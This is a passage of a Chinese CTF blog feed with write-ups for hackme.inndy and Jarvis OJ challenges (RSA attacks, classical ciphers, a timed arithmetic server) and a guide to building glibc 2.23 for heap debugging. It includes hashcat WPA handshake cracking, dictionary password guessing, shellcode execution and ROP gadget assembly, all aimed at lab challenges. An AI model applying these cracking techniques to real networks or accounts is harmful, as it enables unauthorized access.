id="ffa"><a href="#ffa" class="headerlink" title="ffa"></a>ffa</h2><blockquote><p>finite field arithmetic</p></blockquote><p>有限域算法? 看不懂, 先无脑上z3. 根据代码来看第一步应该是还原出 a, b, c 的值.</p><p>一开始直接用Int类型跑半天没跑出结果, 后来看了 M4x 师傅的博客才知道BitVec更快orz,  算一算最大262位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> json.load(open(<span class="string">'crypted'</span>)).items():</span><br><span class="line">    globals()[k] = v</span><br><span class="line">    </span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line">a, b, c = BitVecs(<span class="string">'a b c'</span>, <span class="number">262</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> [a, b, c]:</span><br><span class="line">    solver.add(_ &gt;= pow(<span class="number">2</span>, <span class="number">256</span>, m))</span><br><span class="line">    solver.add(_ &lt; pow(<span class="number">2</span>, <span class="number">257</span>, m))</span><br><span class="line">solver.add((a + b * <span class="number">3</span>) % m == x)</span><br><span class="line">solver.add((b - c * <span class="number">5</span>) % m == y)</span><br><span class="line">solver.add((a + c * <span class="number">8</span>) % m == z)</span><br><span class="line"></span><br><span class="line">models = []</span><br><span class="line"><span class="keyword">while</span> solver.check() == sat:</span><br><span class="line">    m = solver.model()</span><br><span class="line">    print(m)</span><br><span class="line">    models.append(m)</span><br><span class="line">    solver.add(Or(a != m[a], b != m[b], c != m[c]))</span><br></pre></td></tr></table></figure><p>这次还好, 只有一组值. </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p = pow(flag, a, M)</span><br><span class="line">q = pow(flag, b, M)</span><br></pre></td></tr></table></figure><p>于是现在变成了已知 p, q, a, b, M, 求 flag.  <del>气氛突然 RSA 了起来.</del></p><p>和 RSA 的共模攻击很像,  <del>照着 CTF wiki  的代码抄一遍</del></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcdext, invert</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">a = m[a].as_long()</span><br><span class="line">b = m[b].as_long()</span><br><span class="line"></span><br><span class="line">gcd, s, t = gcdext(a, b)</span><br><span class="line">s = -s <span class="comment"># 此处 s &lt; 0</span></span><br><span class="line">p = invert(p, M)</span><br><span class="line">plain = pow(p, s, M) * pow(q, t, M) % M</span><br><span class="line">print(long_to_bytes(plain))</span><br></pre></td></tr></table></figure><h1 id="Programming"><a href="#Programming" class="headerlink" title="Programming"></a>Programming</h1><h2 id="fast"><a href="#fast" class="headerlink" title="fast"></a>fast</h2><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; nc hackme.inndy.tw 7707</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>How fast could you be?</p></blockquote><p>nc 上去后题目会给出 10000 个表达式让你求值, 并且限制了时间.</p><p>这道题要注意的点主要是:</p><ul><li>梯子, 没梯子光接收数据都能超时...(一开始还以为这是 feature, 意在让我边接收边计算)</li><li>运算要遵循 C 语言下32位有符号整数的运算规则</li></ul><p>这道题用 cython 很合适, 就拿 cython 来写了. (吹一波 ipython, 真的好用, <code>%load_ext cython</code> 后就能方便地写 cython 代码了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">%%cython </span><br><span class="line">import cython</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">@cython.cdivision(True)</span><br><span class="line">def _eval(int a, op, int b):</span><br><span class="line">    if op == b&apos;+&apos;:</span><br><span class="line">        return a + b</span><br><span class="line">    elif op == b&apos;-&apos;:</span><br><span class="line">        return a - b</span><br><span class="line">    elif op == b&apos;*&apos;:</span><br><span class="line">        return a * b</span><br><span class="line">    elif op == b&apos;/&apos;:</span><br><span class="line">        return a / b</span><br><span class="line"></span><br><span class="line">io = remote(&apos;hackme.inndy.tw&apos;, 7707)</span><br><span class="line">io.recvuntil(&apos;start the game.\n&apos;)</span><br><span class="line">io.sendline(&apos;Yes I know&apos;)</span><br><span class="line"></span><br><span class="line">exps = b&apos;&apos;</span><br><span class="line"></span><br><span class="line">while exps.count(b&apos;\n&apos;) != 10000:</span><br><span class="line">    exps += io.recv()</span><br><span class="line">exps = exps.strip().split(b&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">ans = &apos;&apos;</span><br><span class="line">for i in range(len(exps)):</span><br><span class="line">    exp = exps[i].split()</span><br><span class="line">    a, b = int(exp[0]), int(exp[2])</span><br><span class="line">    op = exp[1]</span><br><span class="line">    ans += f&apos;&#123;_eval(a, op, b)&#125;\n&apos;</span><br><span class="line">io.send(ans)</span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><h1 id="Lucky"><a href="#Lucky" class="headerlink" title="Lucky"></a>Lucky</h1><h2 id="you-guess"><a href="#you-guess" class="headerlink" title="you-guess"></a>you-guess</h2><blockquote><p>Can you guess my password?</p></blockquote><p>观察到 <code>&#39;%s really hates her ex.&#39; % password</code> , 密码应该是个女性人名.<br>随便找个字典跑就行了<br><a href="http://antirez.com/misc/female-names.txt" target="_blank" rel="noopener">female-names</a></p><h1 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h1><h2 id="easy-pdf"><a href="#easy-pdf" class="headerlink" title="easy pdf"></a>easy pdf</h2><blockquote><p>Find the flag from this PDF document</p></blockquote><p>转成 html</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pacman -S poppler</span><br><span class="line">pdftohtml --help</span><br></pre></td></tr></table></figure><h2 id="this-is-a-pen"><a href="#this-is-a-pen" class="headerlink" title="this is a pen"></a>this is a pen</h2><blockquote><p>Find the flag from this pdf</p></blockquote><p>和上一题一样</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;听奥博大佬说对新手很友好, 来试试&lt;/p&gt;
&lt;p&gt;官方不建议直接给出 flag, 就不放 flag 了&lt;/p&gt;
    
    </summary>
    
      <category term="writeup" scheme="https://www.aloxaf.com/categories/writeup/"/>
    
    
      <category term="pwn" scheme="https://www.aloxaf.com/tags/pwn/"/>
    
      <category term="ctf" scheme="https://www.aloxaf.com/tags/ctf/"/>
    
      <category term="writeup" scheme="https://www.aloxaf.com/tags/writeup/"/>
    
      <category term="misc" scheme="https://www.aloxaf.com/tags/misc/"/>
    
      <category term="crypto" scheme="https://www.aloxaf.com/tags/crypto/"/>
    
      <category term="reverse" scheme="https://www.aloxaf.com/tags/reverse/"/>
    
      <category term="web" scheme="https://www.aloxaf.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>在 Arch Linux 下使用 glibc 2.23 调试程序&amp;使用 pwndbg</title>
    <link href="https://www.aloxaf.com/2018/07/arch_glibc_2.23/"/>
    <id>https://www.aloxaf.com/2018/07/arch_glibc_2.23/</id>
    <published>2018-07-14T03:16:09.000Z</published>
    <updated>2018-08-12T01:23:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>glibc 2.26开始, 引入了 tcache 技术. 使得对 UAF 漏洞的利用非常困难.<br>(更: 听 M4x 师傅说其实安全性下降了? <a href="http://tukan.farm/2017/07/08/tcache/" target="_blank" rel="noopener">thread local caching in glibc malloc</a>)<br><a id="more"></a></p><p>然后 Arch 的 glibc 已经到了 2.27.... 再加上 pwndbg 的作者与堆相关的一系列命令只对 Ubuntu 做了适配...</p><p>pwn 的世界对 <del>Archer</del> 真是充满了恶意 = =</p><p>放弃 Arch 是不可能放弃的, 这辈子都不可能放弃的. 所幸有大佬提出, <a href="https://github.com/pwndbg/pwndbg/issues/340#issuecomment-328883073" target="_blank" rel="noopener">使用带Debug Symbols的glibc可以成功运行heap等命令</a>,<br>试了一下果然如此. 可是把默认的 glibc 换成带调试符号的总觉得不好. 而且这样也没有解决 tcache 的问题. </p><p>一番尝试之后, 我得到了如下的解决方案,<br>记录一下以免忘记. <del>因为已经忘了一次</del></p><h1 id="编译glibc-2-23"><a href="#编译glibc-2-23" class="headerlink" title="编译glibc-2.23"></a>编译glibc-2.23</h1><h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><p>获取 glibc-2.23</p><p><code>/tmp&gt; wget https://ftp.gnu.org/gnu/glibc/glibc-2.23.tar.xz</code><br><code>/tmp&gt; x glibc-2.23.tar.xz</code></p><h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>修改源码, 防止一些奇怪的问题 <a href="https://git.busybox.net/buildroot/commit/?id=cf821efbd0b24690b52f379d4a9934a16073762e" target="_blank" rel="noopener">glibc: add patch fixing the build with binutils 2.29</a></p><p>简要地讲就是把 <code>misc/regexp.c</code> 中的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *loc1;</span><br><span class="line"><span class="keyword">char</span> *loc2;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="keyword">char</span> *loc;</span><br></pre></td></tr></table></figure><p>换成</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *loc1 __attribute__ ((nocommon));</span><br><span class="line"><span class="keyword">char</span> *loc2 __attribute__ ((nocommon));</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="keyword">char</span> *locs __attribute__ ((nocommon));</span><br></pre></td></tr></table></figure><p>PS. 原链接中还多了一个 <code>compat_symbol</code>, 但是我没加也编译过了....就不管了</p><h2 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h2><p>建立编译文件夹</p><p><code>/tmp&gt;md glibc-build-32</code><br><code>/tmp&gt;md glibc-build-64</code></p><p>然后随便cd进一个</p><p>32位使用如下命令配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../glibc-2.23/configure --<span class="built_in">disable</span>-werror --prefix=/home/aloxaf/.<span class="built_in">local</span>/lib/glibc-2.23_x86 --host=i686-linux-gnu --build=i686-linux-gnu CC=<span class="string">"gcc -m32"</span> CXX=<span class="string">"g++ -m32"</span> CFLAGS=<span class="string">"-g -O2 -march=i686 -fno-stack-protector"</span> CXXFLAGS=<span class="string">"-g -O2 -march=i686 -fno-stack-protector"</span> --<span class="built_in">enable</span>-debug=yes</span><br></pre></td></tr></table></figure><p>64位使用如下命令配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../glibc-2.23/configure --<span class="built_in">disable</span>-werror --prefix=/home/aloxaf/.<span class="built_in">local</span>/lib/glibc-2.23 --<span class="built_in">enable</span>-debug=yes CFLAGS=<span class="string">"-O2 -g"</span> CPPFLAGS=<span class="string">"-O2 -g"</span></span><br></pre></td></tr></table></figure><p>Note:</p><ul><li><code>--prefix</code>请自行更改, 简要地讲就是你打算把这个glibc装到哪个地方</li><li>32位不加 <code>-fno-stack-protector</code> 会出现奇怪的link问题. 反正这个只是用来调试的, 就这样粗暴地解决吧.</li></ul><p>配置完以后分别 <code>make -j4 &amp;&amp; make install</code> 就安装完成了</p><h1 id="配置运行环境"><a href="#配置运行环境" class="headerlink" title="配置运行环境"></a>配置运行环境</h1><p>大多数 elf 编译的时候都写死了ld的路径 <code>/usr/lib/ld.so</code>, 这就比较尴尬. 就算强行让 2.26 的 ld.so 加载 2.23 的libc, 也指不定会出啥奇怪问题.</p><p>幸运的是看雪大佬已经给出了方案: <a href="https://bbs.pediy.com/thread-225849.htm" target="_blank" rel="noopener">关于不同版本glibc强行加载的方法（附上代码）</a><br>虽然很暴力, 但是有效啊.</p><p>不过每次都把ld.so复制到当前文件夹下 &amp;&amp; 使用 <code>LD_PRELOAD</code> 指定libc好麻烦的样子,<br>于是结合自己的经验, 修改了一下脚本.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># https://bbs.pediy.com/thread-225849.htm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> tempfile <span class="keyword">import</span> gettempprefix</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_ld</span><span class="params">(binary: str)</span>-&gt;str:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    更改ELF文件加载的libc版本</span></span><br><span class="line"><span class="string">    :param binary: ELF路径</span></span><br><span class="line"><span class="string">    :param ld:   ld.so路径</span></span><br><span class="line"><span class="string">    :param libc: lib.so路径</span></span><br><span class="line"><span class="string">    :return: 新的ELF文件路径</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    binary = ELF(binary)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> segment <span class="keyword">in</span> binary.segments:</span><br><span class="line">        <span class="keyword">if</span> segment.header[<span class="string">'p_type'</span>] == <span class="string">'PT_INTERP'</span>:</span><br><span class="line">            size = segment.header[<span class="string">'p_memsz'</span>]</span><br><span class="line">            addr = segment.header[<span class="string">'p_paddr'</span>]</span><br><span class="line">            data = segment.data()</span><br><span class="line"></span><br><span class="line">            ld = <span class="string">'/opt/ctf/ld.so'</span> <span class="keyword">if</span> binary.arch == <span class="string">'amd64'</span> <span class="keyword">else</span> <span class="string">'/opt/ctf/ld32.so'</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> size &lt;= len(ld):</span><br><span class="line">                <span class="keyword">raise</span> Exception(</span><br><span class="line">                    <span class="string">"Failed to change PT_INTERP from &#123;&#125; to &#123;&#125;"</span>.format(data, ld))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">            binary.write(addr, ld.ljust(size, <span class="string">'\0'</span>).encode())</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.access(<span class="string">'/tmp/easypwn'</span>, os.F_OK):</span><br><span class="line">                os.mkdir(<span class="string">'/tmp/easypwn'</span>)</span><br><span class="line">            path = <span class="string">'/tmp/easypwn/&#123;&#125;_debug'</span>.format(</span><br><span class="line">                os.path.basename(binary.path))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> os.access(path, os.F_OK):</span><br><span class="line">                os.remove(path)</span><br><span class="line">                <span class="comment"># print("Removing exist file &#123;&#125;".format(path))</span></span><br><span class="line">            binary.save(path)</span><br><span class="line">            os.chmod(path, <span class="number">0b111000000</span>)  <span class="comment"># rwx------</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print("PT_INTERP has changed from &#123;&#125; to &#123;&#125;. Using temp file &#123;&#125;".format(data, ld, path))</span></span><br><span class="line">    <span class="keyword">return</span> ELF(path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    change_ld(sys.argv[<span class="number">1</span>]).save(sys.argv[<span class="number">2</span>])</span><br><span class="line">    os.chmod(sys.argv[<span class="number">2</span>], <span class="number">0b111000000</span>)</span><br></pre></td></tr></table></figure><p>其中 <code>/opt/ctf/ld.so</code> 是 <code>/home/aloxaf/.local/lib/glibc-2.23/lib/ld-2.23.so</code> 的硬链接,<br>32位版以此类推.</p><p>建立硬链接主要是为了缩短路径长度, 保证能够替换掉原来的路径.</p><p>然后给这个.py加个硬链接到 <code>~/.local/bin</code>, 就可以直接 <code>change_ld test test-debug</code> 让这个 elf  默认加载我们自己编译的glibc了.</p><h2 id="愉快地Debug-吧少年-Arch-Linux-大法好折腾"><a href="#愉快地Debug-吧少年-Arch-Linux-大法好折腾" class="headerlink" title="愉快地Debug 吧少年, Arch Linux 大法好折腾"></a>愉快地Debug 吧少年, Arch Linux 大法好<del>折腾</del></h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;glibc 2.26开始, 引入了 tcache 技术. 使得对 UAF 漏洞的利用非常困难.&lt;br&gt;(更: 听 M4x 师傅说其实安全性下降了? &lt;a href=&quot;http://tukan.farm/2017/07/08/tcache/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;thread local caching in glibc malloc&lt;/a&gt;)&lt;br&gt;
    
    </summary>
    
      <category term="linux" scheme="https://www.aloxaf.com/categories/linux/"/>
    
    
      <category term="linux" scheme="https://www.aloxaf.com/tags/linux/"/>
    
      <category term="pwn" scheme="https://www.aloxaf.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Jarvis OJ BASIC 完整writeup</title>
    <link href="https://www.aloxaf.com/2018/05/jarvisoj_basic/"/>
    <id>https://www.aloxaf.com/2018/05/jarvisoj_basic/</id>
    <published>2018-05-17T00:23:16.000Z</published>
    <updated>2018-08-13T02:04:57.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="握手包"><a href="#握手包" class="headerlink" title="握手包"></a>握手包</h1><blockquote><p>给你握手包，flag是Flag_is_here这个AP的密码，自己看着办吧。</p><p>提交格式：flag{WIFI密码}</p></blockquote><p>利用 hashcat 爆破, 以 Arch Linux 为例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装必要工具</span></span><br><span class="line">sudo pacman -S hashcat hashcat-utils</span><br><span class="line"><span class="comment"># 格式转换</span></span><br><span class="line">cap2hccapx wifi.cap wifi.hccapx</span><br><span class="line"><span class="comment"># 用字典爆破</span></span><br><span class="line">hashcat -m 2500 wifi.hccapx 10k_most_common.txt</span><br></pre></td></tr></table></figure><a id="more"></a><p>很快就跑出了结果<br><code>e56452df7244988624af174fa692d81d:560a64ffe917:b8ee65ac640b:Flag_is_here:11223344</code></p><p>flag 为 <code>flag{11223344}</code></p><h1 id="德军的密码"><a href="#德军的密码" class="headerlink" title="德军的密码"></a>德军的密码</h1><blockquote><p>已知将一个flag以一种加密形式为使用密钥进行加密，使用密钥WELCOMETOCFF加密后密文为000000000000000000000000000000000000000000000000000101110000110001000000101000000001 请分析出flag。Flag为12位大写字母 题目来源：CFF2016</p></blockquote><p>密钥长度 12 位, 密文长度 84 位. 初步推断密文七位一组.</p><p>尝试将密文七位一组转成数字以后与密钥进行各种运算, 最终试出 flag 是异或得到的 <code>WELCOMECISRG</code></p><p>(查了一下这种密码其实叫 <a href="https://baike.baidu.com/item/%E8%B4%B9%E7%BA%B3%E5%A7%86%E5%AF%86%E7%A0%81" target="_blank" rel="noopener">费纳姆密码 </a>)</p><h1 id="字符串"><a href="#字符串" class="headerlink" title="-.-字符串"></a>-.-字符串</h1><blockquote><p>请选手观察以下密文并转换成flag形式</p><p>..-. .-.. .- --. ..... ..--- ..--- ----- .---- ---.. -.. -.... -.... ..... ...-- ---.. --... -.. .---- -.. .- ----. ...-- .---- ---.. .---- ..--- -... --... --... --... -.... ...-- ....- .---- -----</p><p>flag形式为32位大写md5</p><p>题目来源：CFF2016</p></blockquote><p> 摩斯密码, 解码后得到 <code>FLAG522018D665387D1DA931812B77763410</code></p><h1 id="A-Piece-Of-Cake"><a href="#A-Piece-Of-Cake" class="headerlink" title="A Piece Of Cake"></a>A Piece Of Cake</h1><blockquote><p>nit yqmg mqrqn bxw mtjtm nq rqni fiklvbxu mqrqnl xwg dvmnzxu lqjnyxmt xatwnl, rzn nit uxnntm xmt zlzxuuk mtjtmmtg nq xl rqnl. nitmt vl wq bqwltwlzl qw yivbi exbivwtl pzxuvjk xl mqrqnl rzn nitmt vl atwtmxu xamttetwn xeqwa tsftmnl, xwg nit fzruvb, nixn mqrqnl ntwg nq gq lqet qm xuu qj nit jquuqyvwa: xbbtfn tutbnmqwvb fmqamxeevwa, fmqbtll gxnx qm fiklvbxu ftmbtfnvqwl tutbnmqwvbxuuk, qftmxnt xznqwqeqzluk nq lqet gtamtt, eqdt xmqzwg, qftmxnt fiklvbxu fxmnl qj vnltuj qm fiklvbxu fmqbtlltl, ltwlt xwg exwvfzuxnt nitvm twdvmqwetwn, xwg tsivrvn vwntuuvatwn rtixdvqm - tlftbvxuuk rtixdvqm yivbi evevbl izexwl qm qnitm xwvexul. juxa vl lzrlnvnzntfxllvldtmktxlkkqzaqnvn. buqltuk mtuxntg nq nit bqwbtfn qj x mqrqn vl nit jvtug qj lkwnitnvb rvquqak, yivbi lnzgvtl twnvnvtl yiqlt wxnzmt vl eqmt bqefxmxrut nq rtvwal nixw nq exbivwtl.</p></blockquote><p>一堆看不懂的玩意儿, 可能是凯撒或者替代密码之类的</p><p>找各种网站试试, 最后试出来是替代密码, 解密网站: <a href="https://quipqiup.com/" target="_blank" rel="noopener">https://quipqiup.com/</a></p><p>解密结果</p><blockquote><p>​    the word robot can refer to both physical robots and virtual software agents, but the latter are usually referred to as bots. there is no consensus on which machines qualify as robots but there is general agreement among experts, and the public, that robots tend to do some or all of the following: accept electronic programming, process data or physical perceptions electronically, operate autonomously to some degree, move around, operate physical parts of itself or physical processes, sense and manipulate their environment, and exhibit intelligent behavior - especially behavior which mimics humans or other animals. flag is substitutepassisveryeasyyougotit. closely related to the concept of a robot is the field of synthetic biology, which studies entities whose nature is more comparable to beings than to machines.</p></blockquote><blockquote><p>flag is substitutepassisveryeasyyougotit</p></blockquote><h1 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h1><p>啥鬼畜题目...</p><p>在 Windows 用 <a href="https://github.com/inquisb/shellcodeexec" target="_blank" rel="noopener">shellcodeexec</a> 跑一下得到结果...</p><h1 id="Help"><a href="#Help" class="headerlink" title="Help!!"></a>Help!!</h1><p>先是伪加密, <code>zip -FF</code> 修复一下. 再解压 .docx 找到隐藏的图片文件</p><p><code>PGTF [You_Know_moR3_4boUt_woRd}</code></p><h1 id="Baby-39-s-Crack"><a href="#Baby-39-s-Crack" class="headerlink" title="Baby&#39;s Crack"></a>Baby&#39;s Crack</h1><p>很简单的加密算法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"></span><br><span class="line">cipher = open(<span class="string">'./flag.enc'</span>, <span class="string">'rb'</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wtf</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">47</span> &lt; n &lt;= <span class="number">96</span>:</span><br><span class="line">        <span class="keyword">return</span> n + <span class="number">53</span></span><br><span class="line">    <span class="keyword">elif</span> n &lt;= <span class="number">46</span>:</span><br><span class="line">        <span class="keyword">return</span> n % <span class="number">11</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">61</span> * (n // <span class="number">61</span>)</span><br><span class="line"></span><br><span class="line">d = &#123;wtf(i): i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">255</span>)&#125;</span><br><span class="line"></span><br><span class="line">p = <span class="string">''</span>.join((chr(d[i]) <span class="keyword">for</span> i <span class="keyword">in</span> cipher))</span><br><span class="line">print(number.long_to_bytes(int(p, <span class="number">16</span>)).decode())</span><br></pre></td></tr></table></figure><h1 id="熟悉的声音"><a href="#熟悉的声音" class="headerlink" title="熟悉的声音"></a>熟悉的声音</h1><p>两种元素, 声音, 联想到摩斯电码, 解密得到 JBLUWEWNZ </p><p>然而其实并不是最终 flag, 还套了一层凯撒......</p><h1 id="取证"><a href="#取证" class="headerlink" title="取证"></a>取证</h1><p>搜吧, 最后搜到是 <code>Volatility</code></p><h1 id="ROPGadget"><a href="#ROPGadget" class="headerlink" title="ROPGadget"></a>ROPGadget</h1><p>用 pwntools 的 asm 命令编译一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asm(<span class="string">'xchg eax, esp;ret;mov ecx, [eax];mov [edx], ecx;pop ebx;ret'</span>).encode(<span class="string">'hex'</span>).upper()</span><br></pre></td></tr></table></figure><h1 id="Easy-RSA"><a href="#Easy-RSA" class="headerlink" title="Easy RSA"></a>Easy RSA</h1><p>N 这么小, 直接用 factor 命令就能分解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"></span><br><span class="line">c = <span class="number">0xdc2eeeb2782c</span></span><br><span class="line">p, q = <span class="number">13574881</span>, <span class="number">23781539</span></span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">23</span></span><br><span class="line">d = gmpy2.invert(e, (p<span class="number">-1</span>) * (q<span class="number">-1</span>))</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line">print(number.long_to_bytes(m))</span><br></pre></td></tr></table></figure><h1 id="爱吃培根的出题人"><a href="#爱吃培根的出题人" class="headerlink" title="爱吃培根的出题人"></a>爱吃培根的出题人</h1><p>培根密码</p><h1 id="Secret"><a href="#Secret" class="headerlink" title="Secret"></a>Secret</h1><p>藏在 HEADERS 里</p><h1 id="Easy-Crackme"><a href="#Easy-Crackme" class="headerlink" title="Easy Crackme"></a>Easy Crackme</h1><p>拖进 IDA F5, 整理一下以后其实是这样的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 